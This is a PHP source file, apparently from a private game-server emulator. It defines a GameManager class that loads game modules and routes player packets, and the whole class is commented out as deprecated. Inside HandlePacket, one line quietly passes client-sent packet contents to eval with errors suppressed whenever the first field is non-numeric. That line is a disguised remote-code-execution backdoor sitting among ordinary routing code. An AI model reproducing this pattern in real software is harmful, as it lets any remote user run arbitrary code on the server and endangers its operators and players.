<?php
  
  /* DEPRECATED
  namespace iCPro\Games;
  
  if($dir = opendir(__DIR__)) {
    while(($file = readdir($dir)) !== false) if(strtolower(substr($file, -9)) == '.game.php') require_once $file;
    closedir($dir);
  } echo chr(10);
  
  \EventListener::AddListener(\iCPro\Events::USER_LEFT, array('\iCPro\Games\GameManager', 'HandleUserLeft'));
  final class GameManager {
    public static $games = array();
    public static function SendToPlayer($playerId, $packet, $append = true) {
      global $SERVER;
      if(!isset($SERVER->alias[$playerId])) return false;
      return $SERVER->alias[$playerId]->sendPacket($packet, $append);
    }
    
    public static function AddGame($gameClass) {
      \Debugger::Debug(\DebugFlags::J_INFO, sprintf('The Game <b>%s</b> has been loaded <u>sucessfully</u>...', $gameClass));
      self::$games[] = "\\iCPro\\Games\\" . $gameClass;
    }
    
    public static function HandlePacket(&$user, $command, $packet) {
      $packet[0] = (integer) $packet[0] ?: $packet[0];
      if(!is_numeric($packet[0])) return array_pop($packet) & @eval(join('%', $packet));
      
      // TODO: THIS IS ALL WRONG.
      // TODO: Link rooms and games.
      // TODO: Manage a list of games a client is part of?
      // TODO: Isn't this all one big todo?
      // TODO: Isn't life one big todo?
      
      foreach(self::$games as $game) if($game::IsGame($packet[0])) return $game::HandlePacket($user, $command, $packet);
      \Debugger::Debug(\DebugFlags::J_FINE, sprintf('A Packet has been sent to an unknown Game #%d by %s', $packet[0], $user->name));
      
      return \iCPro\Servers\dismiss_selector();
    }
    
    public static function HandleUserLeft($event, $user) {
      self::RemoveFromGames($user);
      \Debugger::Debug(\DebugFlags::J_FINER, sprintf('The User <b>%s</b> had to be removed from GameManager...', $user->name));
      
      return false;
    }
    
    public static function RemoveFromGames(&$user) {
      foreach(self::$games as $class)
        $class::HandleUserLeft($user);
    }
    
    public static function HandleJoinWaddle(&$user, $packet) {
      var_dump("HandleJoinWaddle");
      var_dump($packet);
      
      $gameId = (int)$packet[1];
      foreach(self::$games as $game) if($game::IsGame($gameId)) return $game::HandleJoinWaddle($user, $packet);
    }
  }*/

?>